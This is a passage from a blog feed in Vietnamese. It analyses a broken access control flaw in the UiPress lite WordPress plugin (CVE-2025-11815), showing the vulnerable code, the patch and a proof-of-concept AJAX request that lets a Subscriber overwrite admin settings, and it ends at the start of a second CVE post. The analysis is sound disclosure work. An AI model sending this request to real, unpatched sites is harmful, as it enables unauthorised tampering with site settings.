noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.09&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký một danh sách dài các AJAX:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;      &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;      &amp;#34;uip_get_post_types&amp;#34;,&#xA;      &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;      &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;      &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;      &amp;#34;uip_delete_post&amp;#34;,&#xA;      &amp;#34;uip_save_user_preference&amp;#34;,&#xA;      &amp;#34;uip_get_user_preference&amp;#34;,&#xA;      &amp;#34;uip_search_content&amp;#34;,&#xA;      &amp;#34;uip_process_form_input&amp;#34;,&#xA;      &amp;#34;uip_send_form_email&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;      &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;      &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;      &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;      &amp;#34;uip_get_sync_options&amp;#34;,&#xA;      &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;      &amp;#34;uip_save_sync_options&amp;#34;,&#xA;      &amp;#34;uip_start_site_sync&amp;#34;,&#xA;      &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;      &amp;#34;uip_process_block_query&amp;#34;,&#xA;      &amp;#34;uip_save_site_option&amp;#34;,&#xA;      &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;      &amp;#34;uip_global_export&amp;#34;,&#xA;      &amp;#34;uip_global_import&amp;#34;,&#xA;      &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;      &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    foreach ($function_names as $name) {&#xA;      add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiền tố &lt;code&gt;wp_ajax_&lt;/code&gt; cho biết các AJAX này chỉ chạy với người dùng đã đăng nhập.&lt;/p&gt;&#xA;&lt;p&gt;Ở bản lỗi &lt;strong&gt;v3.5.08&lt;/strong&gt;, toàn bộ callback đều không kiểm tra quyền người dùng. Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_save_site_option()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    $option = json_decode(stripslashes($_POST[&amp;#34;option&amp;#34;]));&#xA;    $option = Sanitize::clean_input_with_code($option);&#xA;    $optionName = sanitize_text_field($_POST[&amp;#34;optionName&amp;#34;]);&#xA;&#xA;    if (!$optionName) {&#xA;      Ajax::error(__(&amp;#34;No option name specified&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;&#xA;    UipOptions::update($optionName, $option);&#xA;&#xA;    $returndata[&amp;#34;success&amp;#34;] = true;&#xA;    $returndata[&amp;#34;message&amp;#34;] = __(&amp;#34;Option saved&amp;#34;, &amp;#34;uipress-lite&amp;#34;);&#xA;    wp_send_json($returndata);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này thực hiện update option &lt;code&gt;uip-global-settings&lt;/code&gt; trong database với các giá trị &lt;code&gt;option&lt;/code&gt; và &lt;code&gt;optionName&lt;/code&gt; được lấy từ POST request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function update($key = null, $newValue = false)&#xA;{&#xA;    $options = get_option(&amp;#34;uip-global-settings&amp;#34;);&#xA;    $options = $options ? $options : [];&#xA;&#xA;    if (isset($key)) {&#xA;        $options[$key] = $newValue;&#xA;    } else {&#xA;        $options = $newValue;&#xA;    }&#xA;&#xA;    update_option(&amp;#34;uip-global-settings&amp;#34;, $options);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Option này được lưu trong bảng &lt;code&gt;wp_options&lt;/code&gt; với &lt;code&gt;option_name&lt;/code&gt; là &lt;code&gt;uip-global-settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mặc dù &lt;code&gt;Ajax::check_referer()&lt;/code&gt; kiểm tra CSRF bằng &lt;code&gt;security&lt;/code&gt; nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    $doingAjax = defined(&amp;#34;DOING_AJAX&amp;#34;) &amp;amp;&amp;amp; DOING_AJAX;&#xA;    $referer = check_ajax_referer(&amp;#34;uip-security-nonce&amp;#34;, &amp;#34;security&amp;#34;) &amp;gt; 0;&#xA;    $result = $doingAjax &amp;amp;&amp;amp; $referer;&#xA;&#xA;    if (!$result) {&#xA;        self::error(__(&amp;#34;Unable to perform action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nonce này xuất hiện trong Dashboard của mọi người dùng đã đăng nhập, kể cả Subscriber. Tuy nhiên các hành động AJAX thực tế chỉ dành cho admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#34; title=&#34;Nonce trong admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce trong admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;215&#34; width=&#34;838&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce trong admin Dashboard&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ở bản vá &lt;strong&gt;v3.5.09&lt;/strong&gt;, nhà phát triển đã bổ sung kiểm tra quyền:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function check_referer()&#xA;{&#xA;    Ajax::check_referer();&#xA;&#xA;    if (!current_user_can(&amp;#34;manage_options&amp;#34;)) {&#xA;      Ajax::error(__(&amp;#34;You do not have permission to perform this action&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; là quyền thuộc về admin, nên chỉ admin mới có thể thực thi các AJAX này.&lt;/p&gt;&#xA;&lt;p&gt;Toàn bộ các callback AJAX đăng ký ở trên đều được áp dụng cùng cơ chế kiểm tra trong bản vá.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Authenticated user (Subscriber or higher)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Dashboard renders → &amp;#39;uip-security-nonce&amp;#39; is available to all logged-in users&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Attacker sends AJAX request: action=uip_save_site_option&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;Hook triggered: wp_ajax_uip_save_site_option&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Ajax::check_referer() validates nonce — passes&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;No capability check is performed&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;uip_save_site_option() executes&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Reads POST parameters: optionName &amp;#43; option&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;Calls UipOptions::update()&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;update_option(&amp;#39;uip-global-settings&amp;#39;, attacker-controlled data)&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Plugin settings overwritten by a low-privileged user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng Subcriber account&lt;/li&gt;&#xA;&lt;li&gt;Lấy nonce từ admin Dashboard&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: subcriber&amp;#43;_cookie&#xA;&#xA;action=uip_save_site_option&amp;amp;security=e032057458&amp;amp;option={payload}&amp;amp;optionName=remote-sync&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;--- Before&#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;a:1:{s:3:&amp;#34;key&amp;#34;;s:27:&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;;}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;------------------------------------------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&#xA;&#xA;-- After &#xA;mysql&amp;gt; select * from wp_options where option_name=&amp;#39;uip-global-settings&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name         | option_value                                 | autoload |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;|       363 | uip-global-settings | a:1:{s:11:&amp;#34;remote-sync&amp;#34;;O:8:&amp;#34;stdClass&amp;#34;:0:{}} | auto     |&#xA;&amp;#43;-----------&amp;#43;---------------------&amp;#43;----------------------------------------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.00 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Error xảy ra&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#34; title=&#34;Error xảy ra khi option thay đổi&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/err.png&#34; data-sub-html=&#34;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;Error xảy ra khi option thay đổi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#39; alt=&#34;Error&#34; height=&#34;347&#34; width=&#34;1252&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Error xảy ra khi option thay đổi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong UiPress lite &amp;lt;= 3.5.08 xuất phát từ việc thiếu kiểm tra quyền trong các AJAX callback dành cho người dùng đã đăng nhập, đặc biệt là hàm &lt;code&gt;uip_save_site_option()&lt;/code&gt;. Mặc dù plugin có kiểm tra CSRF bằng nonce, nonce này lại được cung cấp cho mọi người dùng, bao gồm cả Subscriber. Điều này cho phép bất kỳ tài khoản có quyền thấp nào cũng có thể gọi trực tiếp các hành động AJAX đặc quyền và ghi đè các thiết lập quan trọng của plugin trong &lt;code&gt;uip-global-settings&lt;/code&gt;. Đây là một lỗi Broken Access Control cho phép người dùng quyền thấp sửa đổi dữ liệu chỉ dành cho admin. Bản vá 3.5.09 khắc phục bằng cách thêm kiểm tra &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSRF nonce không đủ an toàn&lt;/strong&gt; nếu thiếu kiểm tra quyền cho hành động được thực thi.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mọi AJAX đặc quyền phải kiểm tra capability&lt;/strong&gt; trước khi xử lý dữ liệu.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce hiển thị cho mọi user&lt;/strong&gt; có thể dẫn đến lạm dụng khi kết hợp với thiếu kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tài khoản quyền thấp không bao giờ được phép chỉnh sửa thiết lập admin&lt;/strong&gt;, dù qua AJAX hay bất kỳ cơ chế nào khác.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce + capability check luôn phải đi kèm nhau&lt;/strong&gt; để tránh CSRF và lỗi leo thang đặc quyền.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-08-missing-authorization-to-authenticated-subscriber-plugin-settings-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.08 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64384 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-09-cve-2025-64384/</link>
      <pubDate>Tue, 09 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-09-cve-2025-64384/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Missing Authorization&lt;/strong&gt; trong &lt;strong&gt;jetmonsters JetFormBuilder&lt;/strong&gt; &lt;strong&gt;jetformbuilder&lt;/strong&gt; cho phép khai thác &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;JetFormBuilder&lt;/strong&gt;: từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 3.5.3&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64384&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64384&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/jetformbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow 